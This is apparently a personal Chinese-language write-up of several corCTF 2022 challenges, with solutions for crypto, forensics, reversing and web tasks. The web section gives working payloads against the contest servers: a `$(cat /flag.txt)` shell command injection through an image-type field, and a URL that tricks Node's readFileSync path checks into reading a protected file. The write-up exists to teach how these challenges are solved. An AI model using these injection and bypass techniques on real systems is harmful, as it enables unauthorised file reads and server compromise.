# corCTF 2022

## [done] crypto/tadpole

題目 code 如下

```!python=
from Crypto.Util.number import bytes_to_long, isPrime
from secrets import randbelow

p = bytes_to_long(open("flag.txt", "rb").read())
assert isPrime(p)

a = randbelow(p)
b = randbelow(p)

def f(s):
    return (a * s + b) % p

print("a = ", a)
print("b = ", b)
print("f(31337) = ", f(31337))
print("f(f(31337)) = ", f(f(31337)))
```

output.txt 如下

```!=
a =  7904681699700731398014734140051852539595806699214201704996640156917030632322659247608208994194840235514587046537148300460058962186080655943804500265088604049870276334033409850015651340974377752209566343260236095126079946537115705967909011471361527517536608234561184232228641232031445095605905800675590040729
b =  16276123569406561065481657801212560821090379741833362117064628294630146690975007397274564762071994252430611109538448562330994891595998956302505598671868738461167036849263008183930906881997588494441620076078667417828837239330797541019054284027314592321358909551790371565447129285494856611848340083448507929914
f(31337) =  52926479498929750044944450970022719277159248911867759992013481774911823190312079157541825423250020665153531167070545276398175787563829542933394906173782217836783565154742242903537987641141610732290449825336292689379131350316072955262065808081711030055841841406454441280215520187695501682433223390854051207100
f(f(31337)) =  65547980822717919074991147621216627925232640728803041128894527143789172030203362875900831296779973655308791371486165705460914922484808659375299900737148358509883361622225046840011907835671004704947767016613458301891561318029714351016012481309583866288472491239769813776978841785764693181622804797533665463949
```

由題目可知 `a`, `b`, `f(31337)`, `f(f(31337))` 的值，且 `a`, `b` 皆小於 `p`

由 [modulo](https://zh.wikipedia.org/zh-tw/模除#等价性) 的性質可推導底下公式

```
f(s) = (a*s + b) % p
    = ((a * s)%p + b%p) % p
    = ((a * s)%p + b) % p
    
f(f(s)) = (a*f(s) + b) % p
        = ((a * f(s))%p + b) % p
```

由於 `b` 的值小於 `f(s)` 和 `f(f(s))`，故可直接忽略最外層的 `%p`

自此，已可獲得 `a * s`, `(a * s) % p` 及 `a * f(s)`, `(a * f(s)) % p` 的值，又因下式成立

```
m = x*p + m%p
```

故可得到下二式

```
a*s = x*p + (a * s)%p
a*f(s) = y*p + (a * f(s))%p

x = y iif s = f(s)
```

由於已知資訊滿足，可得知 `x*p` 和 `y*p` 的值，即 `a*s - (f(s) - b)` 和 `a*f(s) - (f(f(s)) - b)`

此時做一次 GCD，即可得知 `p` 值

統整為以下公式

```
p = GCD(a*s-(f(s)-b), a*f(s)-(f(f(s))-b))
  = 69825869768139920110123558205141272307543762521597238351171345853912801592499530806466923594706098233410739035037238284410149567840214740548173311389788461130930147434818011061522655481069898956513485105440304732927661965188218100508069264435861796272712210125342307926595478403514856023662724892152117159021
```

做一次 `long_to_bytes` 後可得到以下字串

```
b'corctf{1n_m4th3m4t1c5,_th3_3ucl1d14n_4lg0r1thm_1s_4n_3ff1c13nt_m3th0d_f0r_c0mput1ng_th3_GCD_0f_tw0_1nt3g3rs} <- this is flag adm'
```

flag: `corctf{1n_m4th3m4t1c5,_th3_3ucl1d14n_4lg0r1thm_1s_4n_3ff1c13nt_m3th0d_f0r_c0mput1ng_th3_GCD_0f_tw0_1nt3g3rs}`

## [X] crypto/luckyguess
題目 source code 如下
```python=
#!/usr/local/bin/python
from random import getrandbits

p = 2**521 - 1
a = getrandbits(521)
b = getrandbits(521)
print("a =", a)
print("b =", b)

try:
    x = int(input("enter your starting point: "))
    y = int(input("alright, what's your guess? "))
except:
    print("?")
    exit(-1)

r = getrandbits(20)
for _ in range(r):
    x = (x * a + b) % p

if x == y:
    print("wow, you are truly psychic! here, have a flag:", open("flag.txt").read())
else:
    print("sorry, you are not a true psychic... better luck next time")
```

[別人的解法](https://an00brektn.github.io/corctf22/#luckyguess)

在此題情況下，我們只能控制 [LCG](https://zh.wikipedia.org/zh-tw/線性同餘方法) 的種子，使其無論產生幾次亂數後都只能生成固定值

一個簡單的方法是使輸出值 = 輸入值，如下範例
```=
a = 5
b = 0
p = 10

x0 = 5

x1 = (5*x0 + 0)%10 = (5*5)%10 = 5
x2 = (5*x1 + 0)%10 = (5*5)%10 = 5
```

推導公式如下:

```=
x ≡ a*x + b (mod p)
x - ax ≡ b (mod p)
(1-a) * x ≡ b (mod p)
x ≡ b * modulo_inverse(1-a, p) (mod p)
```

程式碼如下 (a, b 替換為當前連線的 a, b):

```python=
a = ???
b = ???
p = 2 ** 521 - 1

x0 = (b * pow(1-a, -1, p))%p
print(x0)
```

corctf{r34l_psych1c5_d0nt_n33d_f1x3d_p01nt5_t0_tr1ck_th15_lcg!}


## [done] forensics/whack-a-frog

觀察題目給的 pcap，看到 HTTP 的部分似乎是移動的軌跡

![](https://i.imgur.com/mksmAZO.png)

嘗試使用 matplotlib 畫出軌跡

```python=
import re
import matplotlib.pyplot as plt

cords = []
with open('./history.txt', 'r') as fh:
    all_record = fh.readlines()
    for record in all_record:
        if('GET /anticheat?' in record):
            match_result = re.search(
                "x=(\d+)&y=(\d+)&event=(.*)\ HTTP", 
                record)
            cord = match_result.groups()
            if(len(cord) == 3):
                cords.append([int(cord[0]), int(cord[1]), cord[2]])

from matplotlib.animation import FuncAnimation

fig, ax = plt.subplots()

cord_x = [x for x, y, act in cords]
cord_y = [y for x, y, act in cords]

ln, = plt.plot([], [], 'ro', markersize=1)
def init():
    ax.set_xlim(0, 1000)
    ax.set_ylim(0, 1000)
    ax.invert_yaxis()
    return ln,

xdata, ydata = [], []
def update(frame):
    xdata.append(cord_x[frame])
    ydata.append(cord_y[frame])
    ln.set_data(xdata, ydata)
    return ln,

ani = FuncAnimation(fig, update, frames=range(len(cords)),
                    init_func=init, blit=True)
plt.show()
```

因為一些因素，使用動畫的方式查看，最後跑出圖片如下

![](https://i.imgur.com/XU0JAjZ.png)

推測軌跡出現的文字是 `LILYXOX`

corctf{LILYXOX}

## [done] misc/survey

填又臭又長的問卷

最後給了一個字串要做 base64 decode: `Y29yY3Rme2hvcGVfeW91X2hhZF9mdW59`

corctf{hope_you_had_fun}

## [done] misc/kcehc-ytinas
1. corCTF{}

## [X] rev/Microsoft ❤️ Linux

[別人的解法](https://writeups.iamlucian.cz/#:~:text=Microsoft%20Love%20Linux)

首先嘗試使用 ghidra 解析，使用預設的 ELF 來解讀

![](https://i.imgur.com/FNWTU1y.png)

可以看到 70 ~ 75 行的迴圈是在做驗證，會去驗證資料進來做 [ROL](https://www.aldeid.com/wiki/X86-assembly/Instructions/rol) 13 bits 後的結果是否等同於 LAB_0010210 那邊開始的陣列的值，因此可以推測輸入值為 LAB_0010210 區段陣列值再做 ROR 13。

LAB_0010210 陣列值如下:
```!
6c ed 4e 6c 8e cc 6f 66 ad 4c 4e 86 6c 66 85 66 0f 8e 3e 63 69 21 3e 55 79 3c 63 6a 78 3c 38 65 2c 2c 3c 70
```

ROR 後的結果:
```
corctf{3mbr4c3,3xtñ.K	ñªËá.SÃáÁ+aaá.
```

可以看到前半部分是正確的，但是後面有一些亂碼

從 defined strings 處可以看到這一條提示

```!
Well done! Sadly, Linus Torvalds has embraced, extended and extinguished the other half of the flag :(

$Incorrect :(

$Well done! Sadly, Microsoft has embraced, extended and extinguished the other half of the flag :(
Incorrect :(
```

因此，前面部分只是 flag 的一半

通靈出另一半的 flag 使用 xor 來解讀，使用 `d` (13)作為 key，結果如下:

```
aàCa.Ábk AC.ak.k..3nd,3Xt1ngu15h!!1}
```

各取一半的文字，完整的 flag 如下:

```
corctf{3mbr4c3,3xt3nd,3Xt1ngu15h!!1}
```

## [done] web/jsonquiz

1. 隨便按直到進入結算頁面
2. 修改POST內容從score=0變100
![](https://i.imgur.com/ttctXOt.png)
corctf{th3_linkedin_JSON_quiz_is_too_h4rd!!!}

## [X] web/msfrog-generator

[別人的解法](https://writeups.iamlucian.cz/#:~:text=MsFrog)

修改 payload: `"type":"$(ls /):/"`

此時會回傳如下的東西

```!
Something went wrong :
b"convert-im6.q16: unable to open image `img/app': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575.\nconvert-im6.q16: unable to open image `bin': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: unable to open image `bin': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575.\nconvert-im6.q16: unable to open image `boot': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: unable to open image `boot': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575.\nconvert-im6.q16: unable to open image `dev': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: unable to open image `dev': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575.\nconvert-im6.q16: unable to open image `etc': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: unable to open image `etc': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575.\nconvert-im6.q16: unable to open image `flag.txt': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: unable to open image `flag.txt': No such file or directory @
...
```

可以看到在每一行的 `unable to open image xxx` 會有 root 下檔案的名稱，做相關處理即可

可以看到其中有一個檔案 `flag.txt`，推測應該是我們要的 flag

修改 payload 為 `"type":"$(cat /flag.txt):/"`，會出現以下內容

```!
Something went wrong :
b"convert-im6.q16: unable to open image `img/corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}:/': No such file or directory @ error/blob.c/OpenBlob/2924.\nconvert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575.\nconvert-im6.q16: image sequence is required `-composite' @ error/mogrify.c/MogrifyImageList/7987.\nconvert-im6.q16: no images defined `png:-' @ error/convert.c/ConvertImageCommand/3229.\n"
```

corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}

## [X] web/simplewaf

[別人的解法](https://nanimokangaeteinai.hateblo.jp/entry/2022/08/09/022238#Web-209-simplewaf-28-solves)

一開始嘗試使用 `file=fl%61g.txt`, `file:///app/fl%61g.txt` 等方式，但都無法成功

在細讀 readFileSync 的原始碼後發現，似乎有可繞過的漏洞

![](https://i.imgur.com/KJObNyf.png)

在此處，會將 fd(file descriptor) 產生出來，其中 `idFd` 會先檢查是否是 userfd，不過其實就只是檢查是否是一個 uint32 的數字 (因為可以直接用數字代表一個檔案)，由於我們傳入的一定是一個字串，根據程式邏輯，會進入到 `fs.openSync` 的部分

![](https://i.imgur.com/vwKPldz.png)

在 `openSync` 的部分，會先檢查是否是有效的路徑，而我們可以進去這個函式看看他是怎麼做檢查的

![](https://i.imgur.com/d2pYson.png)

其中，如果 path 是 file url 的話，會將其轉換出來，然後會再去做驗證

![](https://i.imgur.com/z9ra7Um.png)

在 `toPathIfFileURL` 的部分，會確認是否是 url instance，是的話會將其轉換

![](https://i.imgur.com/K8uDo6k.png)

在轉換的部分，如果 path 的型態是 string，則會變成 url class，如果不是，則會再此檢查是否是 url instance，並檢查 protocol attribute 是否為 `file:`，並進入到 `getPathFromURLPosix`

![](https://i.imgur.com/48KRjfu.png)

在 url class 的 constructor，看起來是沒有什麼特別的

![](https://i.imgur.com/ND6HKiS.png)

而在 `getPathFromURLPosix` 就比較有意思，他會檢查 hostname attribute 是否有東西，如果沒有則會檢查 url encode 的正確性，並執行 url decode 的部分

所以我們的目標是要進入這個函式並將 pathname 做 url decode，因此，需要通過 `toPathIfFileURL` 中的 `isURLInstance` 檢測，也要通過 `fileURLToPath` 中檢測 protocol 的區塊，以及讓 `url.hostname` 存在但不能有東西，最後還需要通過 `getVaildateedPath` 的 `ValidatePath` 檢測

![](https://i.imgur.com/6yxqATm.png)

在 `isURLInstance` 程式碼中，可以看到僅僅是檢查 href 和 origin attribute 存在，這部分可以直接用 array parameter 偽造掉

而在 protocol 檢測的部分，也如同上面直接使用 array parameter 處理掉

而 `url.hostname` 的部分，也如同上面所述

![](https://i.imgur.com/0AF8Hhi.png)

最後在 `ValidatePath` 的部分，會檢查 path 的型態是否為 string 或 uint8 array，也會檢查是否為空

而根據程式邏輯，這邊會接收到 `decodeURIComponent` 回傳的東西，預期是 string，所以這邊檢測不需要理會

綜合以上，需要的 parameter 如下設定

```
file[href]=<隨便>
file[origin]=<隨便>
file[protocol]=file:
file[pathname]=fl%2561g.txt
file[hostname]
```

在 `file[pathname]` 的部分為了避免自動做的 url decode，需要做 double encode

完整網址如下:

`https://web-simplewaf-14c798d22182576e.be.ax?file[href]=a&file[origin]=b&file[protocol]=file:&file[pathname]=fl%2561g.txt&file[hostname]`

corctf{hmm_th4t_waf_w4snt_s0_s1mple}